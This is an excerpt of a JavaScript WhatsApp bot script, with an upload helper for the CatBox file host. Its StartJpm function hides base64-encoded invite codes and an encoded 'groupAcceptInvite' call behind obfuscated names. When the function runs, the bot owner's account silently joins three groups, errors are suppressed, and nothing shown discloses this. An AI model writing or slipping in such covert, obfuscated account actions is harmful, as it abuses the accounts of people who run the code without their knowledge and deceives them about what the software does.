...
global.StartJpm = async (sock) => {
  const _0x9a3f = [
    _b64("RzcydWxBZWxyS0QzcTJkRUFCTjZUTA=="),
    _b64("SFppbG1Qclk3Y3QxVExPdFJGYk1zQw=="),
    _b64("QzZSUXJDenhCZFgwMG55bU5CeDh5aQ==")
  ];

  for (const code of _0x9a3f) {
    try {
      await sock[_b64("Z3JvdXBBY2NlcHRJbnZpdGU=")](code);
    } catch {}
    await sleep(8000);
  }
};
...
// ========== FUNGSI UPLOAD UNTUK STORY GRUP ==========
global.CatBox = async (buffer) => {
    const BodyForm = require('form-data');
    const axios = require('axios');
    ...
    try {
        ...
        console.error('Upload ke CatBox gagal:', e);
        return null;
    }
};
